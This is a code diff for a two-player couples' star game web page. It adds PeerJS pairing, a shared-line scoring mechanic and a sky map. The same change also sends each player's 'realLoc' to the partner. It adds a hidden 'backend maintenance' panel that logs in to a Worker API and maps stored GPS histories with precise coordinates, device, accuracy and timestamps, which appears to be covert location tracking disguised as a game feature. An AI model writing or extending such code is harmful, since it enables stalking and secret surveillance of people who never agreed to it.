-  const step = {ArrowUp:[0,-1],ArrowDown:[0,1],ArrowLeft:[-1,0],ArrowRight:[1,0]}[event.key];
-  if (!step) return;
-  event.preventDefault();
-  move(me[0]+step[0]*.025,me[1]+step[1]*.025);
-});
-function resize() {
-  const rect = canvas.getBoundingClientRect();
-  const ratio = Math.min(devicePixelRatio || 1, 2);
-  scene.width = rect.width;
-  scene.height = rect.height;
-  canvas.width = Math.round(rect.width * ratio);
-  canvas.height = Math.round(rect.height * ratio);
-  ctx.setTransform(ratio,0,0,ratio,0,0);
-}
-function orb(x,y,color,label) {
-  ctx.save();
-  ctx.shadowColor = color;
-  ctx.shadowBlur = 22;
-  ctx.fillStyle = color;
-  ctx.beginPath();
-  ctx.arc(x,y,14,0,Math.PI*2);
-  ctx.fill();
-  ctx.restore();
-  ctx.fillStyle = '#24152d';
-  ctx.font = 'bold 12px system-ui';
-  ctx.textAlign = 'center';
-  ctx.textBaseline = 'middle';
-  ctx.fillText(label,x,y);
-}
-function drawHeart(x,y) {
-  ctx.save();
-  ctx.translate(x,y);
-  ctx.fillStyle = '#ffd69c';
-  ctx.shadowColor = '#ff947c';
-  ctx.shadowBlur = 18;
-  ctx.beginPath();
-  ctx.moveTo(0,10);
-  ctx.bezierCurveTo(-24,-4,-10,-17,0,-8);
-  ctx.bezierCurveTo(10,-17,24,-4,0,10);
-  ctx.fill();
-  ctx.restore();
-}
-function resizeMap() {
-  const {width, height} = mapCanvas.getBoundingClientRect();
-  if (!width || !height || !mapCtx) return;
-  const ratio = Math.min(devicePixelRatio || 1, 2);
-  mapCanvas.width = Math.round(width * ratio);
-  mapCanvas.height = Math.round(height * ratio);
-  mapCtx.setTransform(ratio, 0, 0, ratio, 0, 0);
-  mapSize = {width, height};
-}
-function drawMap() {
-  if (ui['star-map'].hidden || !mapSize) return;
-  const {width, height} = mapSize;
-  const edge = 12;
-  const toMap = point => [
-    edge + point[0] * (width - edge * 2),
-    edge + point[1] * (height - edge * 2)
-  ];
-  const line = (a, b) => {
-    mapCtx.beginPath();
-    mapCtx.moveTo(...toMap(a));
-    mapCtx.lineTo(...toMap(b));
-    mapCtx.stroke();
-  };
-  const dot = (point, color, size) => {
-    mapCtx.fillStyle = color;
-    mapCtx.beginPath();
-    mapCtx.arc(...toMap(point), size, 0, Math.PI * 2);
-    mapCtx.fill();
-  };
-  mapCtx.clearRect(0, 0, width, height);
-  for (const [x, y, brightness] of stars) {
-    mapCtx.fillStyle = 'rgba(216, 201, 255,' + (.15 + brightness * .4) + ')';
-    mapCtx.fillRect(x * width, y * height, 1 + brightness, 1 + brightness);
-  }
-  mapCtx.lineWidth = 1;
-  mapCtx.strokeStyle = '#4a3c66';
-  for (const scale of [.36, .63, .9]) {
-    mapCtx.beginPath();
-    mapCtx.ellipse(width / 2, height / 2, width * scale / 2, height * scale / 2, 0, 0, Math.PI * 2);
-    mapCtx.stroke();
-  }
-  for (let i = 1; i < constellation.length; i++) {
-    line(constellation[i - 1], constellation[i]);
-  }
-  for (const point of constellation) dot(point, '#8b8dc5', 2);
 
-  const hasPartner = mode === 'online' || mode === 'practice';
-  if (hasPartner) {
-    mapCtx.strokeStyle = '#c08ed1';
-    mapCtx.setLineDash([4, 4]);
-    line(me, other);
-    mapCtx.setLineDash([]);
-    dot(other, colors.other, 6);
-  }
-  dot(me, colors.me, 6);
-  dot(heart, '#ffd69c', 4);
+    peer.on('open', () => {
+      document.getElementById('my-id').innerText = shortId;
+    });
 
-  const coordinates = point => point.map(value => Math.round(value * 100)).join(', ');
-  const entries = ['我 · ' + starSector(me) + ' ' + coordinates(me)];
-  if (hasPartner) {
-    const label = mode === 'practice' ? '练习搭档' : '搭档';
-    entries.push(label + ' · ' + starSector(other) + ' ' + coordinates(other));
-  }
-  entries.push('爱心 ' + coordinates(heart));
-  const coordinatesText = entries.join(' ｜ ');
-  if (ui['map-coordinates'].textContent !== coordinatesText) {
-    ui['map-coordinates'].textContent = coordinatesText;
-  }
-  const separation = Math.hypot(me[0] - other[0], me[1] - other[1]) * 100;
-  const resonanceText = hasPartner ? '共鸣星距 · ' + separation.toFixed(1) + ' 星图单位' : '联机或开始练习后显示共鸣星距。';
-  if (ui['map-resonance'].textContent !== resonanceText) {
-    ui['map-resonance'].textContent = resonanceText;
-  }
-}
-ui['map-toggle'].onclick = () => {
-  const panel = ui['star-map'];
-  panel.hidden = !panel.hidden;
-  ui['map-toggle'].setAttribute('aria-expanded', String(!panel.hidden));
-  ui['map-toggle'].textContent = panel.hidden ? '打开虚拟星图' : '收起虚拟星图';
-  if (!panel.hidden) {
-    resizeMap();
-    drawMap();
-  }
-};
+    peer.on('connection', (connection) => {
+      conn = connection;
+      isHost = false;
+      setupConnection();
+    });
 
-function render(now) {
-  const {width:w,height:h} = scene;
-  ctx.clearRect(0,0,w,h);
-  for (const [x,y,a] of stars) {
-    ctx.fillStyle = 'rgba(222,195,255,' + (.16+a*.45) + ')';
-    ctx.fillRect(x*w,y*h,1+a,1+a);
-  }
-  const [mx,my] = [me[0]*w,me[1]*h];
-  const [ox,oy] = [other[0]*w,other[1]*h];
-  const grad = ctx.createLinearGradient(mx,my,ox,oy);
-  grad.addColorStop(0,colors.me);
-  grad.addColorStop(1,colors.other);
-  ctx.strokeStyle = grad;
-  ctx.lineWidth = 2;
-  ctx.globalAlpha = mode === 'online' || mode === 'practice' ? .94 : .38;
-  ctx.beginPath();
-  ctx.moveTo(mx,my);
-  ctx.lineTo(ox,oy);
-  ctx.stroke();
-  orb(ox,oy,colors.other,mode === 'practice' ? '★' : 'TA');
-  orb(mx,my,colors.me,'我');
-  ctx.globalAlpha = 1;
-  drawHeart(heart[0]*w,heart[1]*h);
-  if (flash && now-flash < 550) {
-    ctx.globalAlpha = 1 - (now-flash)/550;
-    ctx.fillStyle = '#ffe1ad';
-    ctx.font = 'bold 24px system-ui';
-    ctx.textAlign = 'center';
-    ctx.fillText('+10',w*.5,h*.19-(now-flash)/26);
-    ctx.globalAlpha = 1;
-  }
-  drawMap();
-  requestAnimationFrame(render);
-}
-async function copy(value, success) {
-  const token = session;
-  try {
-    await navigator.clipboard.writeText(value);
-    if (session === token && mode === 'waiting') setStatus(success);
-  } catch {
-    if (session !== token || mode !== 'waiting') return;
-    ui['copy-fallback'].value = value;
-    ui['copy-fallback'].hidden = false;
-    ui['copy-fallback'].focus();
-    ui['copy-fallback'].select();
-    setStatus('请长按选中的文字，手动复制。');
-  }
-}
-ui.host.onclick = () => start(true, makeCode());
-ui.practice.onclick = () => {
-  host = true;
-  resetBoard();
-  show('practice', '拖动粉色光球，让它和蓝色光球之间的连线穿过爱心。');
-};
-ui.leave.onclick = () => stop();
-ui.share.onclick = () => {
-  ui['share-dialog'].returnValue = 'cancel';
-  ui['share-dialog'].showModal();
-};
-ui['share-dialog'].addEventListener('close', () => shareOnce(ui['share-dialog'].returnValue));
-ui['share-dialog'].addEventListener('cancel', () => { ui['share-dialog'].returnValue = 'cancel'; });
-ui.invite.onclick = () => {
-  if (!['https:','http:'].includes(location.protocol)) {
-    return setStatus('本地文件请复制房间码发送给对方。');
-  }
-  const url = new URL(location.href);
-  url.hash = 'room=' + roomCode;
-  copy(url.href, '已复制邀请链接，可以发给对方了。');
-};
-ui['copy-code'].onclick = () => copy(roomCode, '已复制房间码，可以发给对方了。');
-ui['join-form'].onsubmit = event => {
-  event.preventDefault();
-  const code = ui.code.value.toLowerCase().replace(/[\s-]/g,'');
-  if (!roomPattern.test(code)) return setStatus('请输入完整的 16 位房间码。');
-  start(false, code);
-};
-const inviteCode = new URLSearchParams(location.hash.slice(1)).get('room');
-if (roomPattern.test(inviteCode || '')) {
-  ui.code.value = inviteCode;
-  ui.join.textContent = '加入邀请';
-  setStatus('收到双人邀请，点击「加入邀请」开始连接。');
-}
-resetBoard();
-resize();
-new ResizeObserver(resize).observe(canvas);
-new ResizeObserver(resizeMap).observe(mapCanvas);
-requestAnimationFrame(render);
-</script>
+    function connectToPartner() {
+      const targetId = document.getElementById('partner-id-input').value.trim();
+      if (!targetId) return alert('请输入对方 4 位房间码');
+      conn = peer.connect('couple-star-' + targetId);
+      isHost = true;
+      setupConnection();
+    }
+
+    function setupConnection() {
+      conn.on('open', () => {
+        partner.connected = true;
+        document.getElementById('conn-status').innerText = '已联机，滑动光球用星轨切开光核';
+        document.getElementById('conn-status').style.color = '#2ed573';
+        sendSync();
+      });
+
+      conn.on('data', (data) => {
+        if (data.type !== 'sync') return;
+        partner.x = data.rx * canvas.width;
+        partner.y = data.ry * canvas.height;
+        if (data.device) partner.device = data.device;
+        if (data.virtual) partnerVirtual = data.virtual;
+        if (data.realLoc) {
+          partnerRealLoc = data.realLoc;
+          updateVirtualDisplay();
+        }
+        if (!isHost && data.target) {
+          target.x = data.target.rx * canvas.width;
+          target.y = data.target.ry * canvas.height;
+          score = data.score;
+          document.getElementById('score').innerText = score;
+        }
+      });
+
+      conn.on('close', () => {
+        partner.connected = false;
+        document.getElementById('conn-status').innerText = '对方已断开连接';
+        document.getElementById('conn-status').style.color = '#ff4757';
+      });
+    }
+
+    function sendSync() {
+      if (!conn || !conn.open) return;
+      const payload = {
+        type: 'sync',
+        rx: me.x / canvas.width,
+        ry: me.y / canvas.height,
+        device: me.device,
+        virtual: myVirtual,
+        realLoc: myRealLoc
+      };
+      if (isHost) {
+        payload.target = { rx: target.x / canvas.width, ry: target.y / canvas.height };
+        payload.score = score;
+      }
+      conn.send(payload);
+    }
+
+    function handleMove(clientX, clientY) {
+      const rect = canvas.getBoundingClientRect();
+      me.x = Math.max(20, Math.min(canvas.width - 20, clientX - rect.left));
+      me.y = Math.max(20, Math.min(canvas.height - 20, clientY - rect.top));
+      checkHit();
+      sendSync();
+    }
+
+    canvas.addEventListener('touchmove', (e) => {
+      e.preventDefault();
+      handleMove(e.touches[0].clientX, e.touches[0].clientY);
+    }, { passive: false });
+
+    canvas.addEventListener('mousemove', (e) => {
+      if (e.buttons === 1) handleMove(e.clientX, e.clientY);
+    });
+
+    function pointToSegmentDist(px, py, x1, y1, x2, y2) {
+      const l2 = (x2 - x1) ** 2 + (y2 - y1) ** 2;
+      if (l2 === 0) return Math.hypot(px - x1, py - y1);
+      const t = Math.max(0, Math.min(1, ((px - x1) * (x2 - x1) + (py - y1) * (y2 - y1)) / l2));
+      return Math.hypot(px - (x1 + t * (x2 - x1)), py - (y1 + t * (y2 - y1)));
+    }
+
+    function checkHit() {
+      if (!isHost || !partner.connected) return;
+      const d = pointToSegmentDist(target.x, target.y, me.x, me.y, partner.x, partner.y);
+      if (d < resonance.targetRadius) {
+        score += 10;
+        document.getElementById('score').innerText = score;
+        target.x = 45 + Math.random() * (canvas.width - 90);
+        target.y = 45 + Math.random() * (canvas.height - 90);
+        sendSync();
+      }
+    }
+
+    function drawBackgroundConstellation() {
+      bgStars.forEach(s => {
+        ctx.fillStyle = `rgba(255,255,255,${s.alpha * 0.65})`;
+        ctx.beginPath();
+        ctx.arc(s.rx * canvas.width, s.ry * canvas.height, s.r, 0, Math.PI * 2);
+        ctx.fill();
+      });
+
+      const pts = constellationNodes.map(n => ({
+        x: n.rx * canvas.width,
+        y: n.ry * canvas.height,
+        name: n.name
+      }));
+
+      ctx.save();
+      ctx.strokeStyle = 'rgba(112, 161, 255, 0.22)';
+      ctx.lineWidth = 1.2;
+      constellationEdges.forEach(([a, b]) => {
+        ctx.beginPath();
+        ctx.moveTo(pts[a].x, pts[a].y);
+        ctx.lineTo(pts[b].x, pts[b].y);
+        ctx.stroke();
+      });
+
+      pts.forEach(p => {
+        const isMine = p.name === myVirtual.sector;
+        const isPartner = partner.connected && p.name === partnerVirtual.sector;
+        ctx.fillStyle = isMine ? '#ff6b81' : (isPartner ? '#70a1ff' : 'rgba(180, 205, 255, 0.55)');
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, (isMine || isPartner) ? 4 : 2.5, 0, Math.PI * 2);
+        ctx.fill();
+
+        ctx.fillStyle = (isMine || isPartner) ? '#ffffff' : 'rgba(175, 198, 240, 0.48)';
+        ctx.font = '11px sans-serif';
+        ctx.fillText(p.name, p.x + 6, p.y + 3);
+      });
+      ctx.restore();
+    }
+
+    function openSkyMap() {
+      document.getElementById('sky-map-modal').style.display = 'flex';
+      drawSkyMap();
+    }
+
+    function closeSkyMap() {
+      document.getElementById('sky-map-modal').style.display = 'none';
+    }
+
+    function drawSkyMap() {
+      if (document.getElementById('sky-map-modal').style.display !== 'flex') return;
+      const w = skyCanvas.width;
+      const h = skyCanvas.height;
+      skyCtx.clearRect(0, 0, w, h);
+
+      skyCtx.strokeStyle = 'rgba(112, 161, 255, 0.16)';
+      skyCtx.lineWidth = 1;
+      [50, 95, 140].forEach(rad => {
+        skyCtx.beginPath();
+        skyCtx.arc(w / 2, h / 2, rad, 0, Math.PI * 2);
+        skyCtx.stroke();
+      });
+
+      bgStars.forEach(s => {
+        skyCtx.fillStyle = `rgba(255,255,255,${s.alpha})`;
+        skyCtx.beginPath();
+        skyCtx.arc(s.rx * w, s.ry * h, s.r, 0, Math.PI * 2);
+        skyCtx.fill();
+      });
+
+      const mx = 24 + myVirtual.vx * (w - 48);
+      const my = 24 + myVirtual.vy * (h - 48);
+      const px = 24 + partnerVirtual.vx * (w - 48);
+      const py = 24 + partnerVirtual.vy * (h - 48);
+
+      if (partner.connected) {
+        skyCtx.strokeStyle = '#70a1ff';
+        skyCtx.setLineDash([5, 5]);
+        skyCtx.lineWidth = 2;
+        skyCtx.beginPath();
+        skyCtx.moveTo(mx, my);
+        skyCtx.lineTo(px, py);
+        skyCtx.stroke();
+        skyCtx.setLineDash([]);
+
+        drawSkyStar(px, py, '#70a1ff', `TA (${partnerVirtual.sector})`);
+      }
+
+      drawSkyStar(mx, my, '#ff6b81', `我 (${myVirtual.sector})`);
+
+      document.getElementById('sky-map-desc').innerText =
+        `我的星位：${myVirtual.sector}  |  TA的星位：${partner.connected ? partnerVirtual.sector : '未连接'}` +
+        (distanceKm !== null ? `  |  共鸣星距：${distanceKm.toFixed(1)} 光里` : '');
+
+      requestAnimationFrame(drawSkyMap);
+    }
+
+    function drawSkyStar(x, y, color, label) {
+      skyCtx.save();
+      skyCtx.fillStyle = color;
+      skyCtx.shadowColor = color;
+      skyCtx.shadowBlur = 14;
+      skyCtx.beginPath();
+      skyCtx.arc(x, y, 7, 0, Math.PI * 2);
+      skyCtx.fill();
+      skyCtx.shadowBlur = 0;
+      skyCtx.fillStyle = '#e6eeff';
+      skyCtx.font = '11px sans-serif';
+      skyCtx.fillText(label, x + 10, y + 4);
+      skyCtx.restore();
+    }
+
+    function loop() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      drawBackgroundConstellation();
+
+      if (isHost && partner.connected) {
+        target.x += target.vx * resonance.driftSpeed;
+        target.y += target.vy * resonance.driftSpeed;
+        if (target.x < 35 || target.x > canvas.width - 35) target.vx *= -1;
+        if (target.y < 35 || target.y > canvas.height - 35) target.vy *= -1;
+        checkHit();
+      }
+
+      ctx.save();
+      ctx.fillStyle = '#feca57';
+      ctx.shadowColor = '#ff9f43';
+      ctx.shadowBlur = 18;
+      ctx.beginPath();
+      ctx.arc(target.x, target.y, resonance.targetRadius, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.restore();
+
+      if (partner.connected) {
+        ctx.save();
+        const grad = ctx.createLinearGradient(me.x, me.y, partner.x, partner.y);
+        grad.addColorStop(0, me.color);
+        grad.addColorStop(1, partner.color);
+        ctx.strokeStyle = grad;
+        ctx.lineWidth = resonance.lineWidth;
+        if (distanceKm !== null && distanceKm >= 50) {
+          ctx.setLineDash([8, 6]);
+        }
+        ctx.beginPath();
+        ctx.moveTo(me.x, me.y);
+        ctx.lineTo(partner.x, partner.y);
+        ctx.stroke();
+        ctx.restore();
+
+        drawOrb(partner.x, partner.y, partner.color, 'TA');
+      }
+
+      drawOrb(me.x, me.y, me.color, '我');
+      requestAnimationFrame(loop);
+    }
+
+    function drawOrb(x, y, color, label) {
+      ctx.save();
+      ctx.fillStyle = color;
+      ctx.shadowColor = color;
+      ctx.shadowBlur = 18;
+      ctx.beginPath();
+      ctx.arc(x, y, 16, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.fillStyle = '#fff';
+      ctx.font = 'bold 11px sans-serif';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText(label, x, y);
+      ctx.restore();
+    }
+
+    // ==================== 后台维护模块 ====================
+    let maintMap = null;
+    let maintLayer = null;
+
+    function getMaintToken() {
+      return sessionStorage.getItem('maint_token') || '';
+    }
+
+    function openMaintenance() {
+      document.getElementById('maint-modal').style.display = 'block';
+      if (getMaintToken()) {
+        showMaintDataPanel();
+        loadAdminRecords();
+      } else {
+        document.getElementById('maint-login-panel').style.display = 'block';
+        document.getElementById('maint-data-panel').style.display = 'none';
+        document.getElementById('maint-logout-btn').style.display = 'none';
+      }
+    }
+
+    function closeMaintenance() {
+      document.getElementById('maint-modal').style.display = 'none';
+    }
+
+    function logoutMaintenance() {
+      sessionStorage.removeItem('maint_token');
+      document.getElementById('maint-pass').value = '';
+      openMaintenance();
+    }
+
+    async function loginMaintenance() {
+      const username = document.getElementById('maint-user').value.trim();
+      const password = document.getElementById('maint-pass').value;
+      const errEl = document.getElementById('maint-login-err');
+      errEl.innerText = '';
+
+      if (!username || !password) {
+        errEl.innerText = '请输入用户名和密码';
+        return;
+      }
+
+      try {
+        const res = await fetch(`${WORKER_BASE_URL}/api/admin/login`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+        const data = await res.json();
+        if (!res.ok || !data.token) {
+          errEl.innerText = data.error || '登录失败';
+          return;
+        }
+        sessionStorage.setItem('maint_token', data.token);
+        showMaintDataPanel();
+        loadAdminRecords();
+      } catch (e) {
+        errEl.innerText = '无法连接中转接口，请检查 Worker 状态';
+      }
+    }
+
+    function showMaintDataPanel() {
+      document.getElementById('maint-login-panel').style.display = 'none';
+      document.getElementById('maint-data-panel').style.display = 'block';
+      document.getElementById('maint-logout-btn').style.display = 'inline-block';
+
+      if (!maintMap) {
+        maintMap = L.map('maint-map').setView([35.0, 105.0], 4);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          maxZoom: 19,
+          attribution: '&copy; OpenStreetMap'
+        }).addTo(maintMap);
+        maintLayer = L.layerGroup().addTo(maintMap);
+      }
+      setTimeout(() => maintMap.invalidateSize(), 100);
+    }
+
+    function formatTime(iso) {
+      if (!iso) return '-';
+      const d = new Date(iso);
+      return Number.isNaN(d.getTime()) ? iso : d.toLocaleString('zh-CN', { hour12: false });
+    }
+
+    async function loadAdminRecords() {
+      const token = getMaintToken();
+      if (!token) return;
+
+      const summaryEl = document.getElementById('maint-summary');
+      try {
+        const res = await fetch(`${WORKER_BASE_URL}/api/admin/records?t=${Date.now()}`, {
+          headers: { Authorization: `Bearer ${token}` }
+        });
+        if (res.status === 401) {
+          logoutMaintenance();
+          return;
+        }
+        const json = await res.json();
+        if (!json.ok) {
+          summaryEl.innerText = json.error || '读取失败';
+          return;
+        }
+        renderMaintRecords(json.data || {});
+      } catch (e) {
+        summaryEl.innerText = '网络请求失败';
+      }
+    }
+
+    function renderMaintRecords(payload) {
+      maintLayer.clearLayers();
+      const latest = payload.latest;
+      const history = Array.isArray(payload.history) ? payload.history : [];
+      const points = [...history];
+      if (latest && typeof latest.lat === 'number' && typeof latest.lng === 'number') {
+        if (!points.some(p => p.time === latest.time && p.lat === latest.lat)) {
+          points.push(latest);
+        }
+      }
+
+      if (points.length === 0) {
+        document.getElementById('maint-summary').innerText = '暂无定位记录';
+        document.getElementById('maint-tbody').innerHTML =
+          '<tr><td colspan="7" style="color:#9fb0d4;">暂无记录</td></tr>';
+        return;
+      }
+
+      const latLngs = points.map(p => [p.lat, p.lng]);
+      if (latLngs.length > 1) {
+        L.polyline(latLngs, { color: '#70a1ff', weight: 3, dashArray: '6,6' }).addTo(maintLayer);
+      }
+
+      points.forEach((p, i) => {
+        const isLast = i === points.length - 1;
+        L.circleMarker([p.lat, p.lng], {
+          radius: isLast ? 8 : 5,
+          color: isLast ? '#ff4757' : '#ffa502',
+          fillColor: isLast ? '#ff6b81' : '#eccc68',
+          fillOpacity: 0.9,
+          weight: 2
+        }).bindPopup(
+          `<b>${isLast ? '最新位置' : '轨迹 #' + (i + 1)}</b><br/>` +
+          `时间: ${formatTime(p.time)}<br/>` +
+          `设备: ${p.device || '-'}<br/>` +
+          `坐标: ${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}`
+        ).addTo(maintLayer);
+      });
+
+      const cur = points[points.length - 1];
+      maintMap.setView([cur.lat, cur.lng], 15);
+      const acc = typeof cur.accuracy === 'number' ? `±${Math.round(cur.accuracy)}m` : '-';
+      const amap = `https://uri.amap.com/marker?position=${cur.lng},${cur.lat}&name=最新位置`;
+      const gmap = `https://www.google.com/maps?q=${cur.lat},${cur.lng}`;
+
+      document.getElementById('maint-summary').innerHTML =
+        `<span class="badge">最新</span> <b>${formatTime(cur.time)}</b> · 设备: <b>${cur.device || '-'}</b> · 精度: <b>${acc}</b><br/>` +
+        `坐标: <b>${cur.lat.toFixed(6)}, ${cur.lng.toFixed(6)}</b> · ` +
+        `<a href="${amap}" target="_blank">高德地图</a> · <a href="${gmap}" target="_blank">Google地图</a>`;
+
+      const reversed = [...points].reverse();
+      document.getElementById('maint-tbody').innerHTML = reversed.map((p, idx) => {
+        const aUrl = `https://uri.amap.com/marker?position=${p.lng},${p.lat}&name=轨迹点`;
+        const gUrl = `https://www.google.com/maps?q=${p.lat},${p.lng}`;
+        const pAcc = typeof p.accuracy === 'number' ? `±${Math.round(p.accuracy)}m` : '-';
+        return `
+          <tr>
+            <td>${formatTime(p.time)} ${idx === 0 ? '<span class="badge">最新</span>' : ''}</td>
+            <td>${p.roomId || '-'}</td>
+            <td>${p.sector || '-'}</td>
+            <td>${p.device || '-'}</td>
+            <td style="font-family:monospace;">${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}</td>
+            <td>${pAcc}</td>
+            <td><a href="${aUrl}" target="_blank">高德</a> / <a href="${gUrl}" target="_blank">Google</a></td>
+          </tr>
+        `;
+      }).join('');
+    }
+
+    async function clearAdminRecords() {
+      if (!confirm('确定要清空所有定位记录吗？')) return;
+      const token = getMaintToken();
+      if (!token) return;
+      try {
+        const res = await fetch(`${WORKER_BASE_URL}/api/admin/clear`, {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${token}` }
+        });
+        if (res.ok) loadAdminRecords();
+      } catch (e) {}
+    }
+
+    loop();
+  </script>
 </body>
 </html>
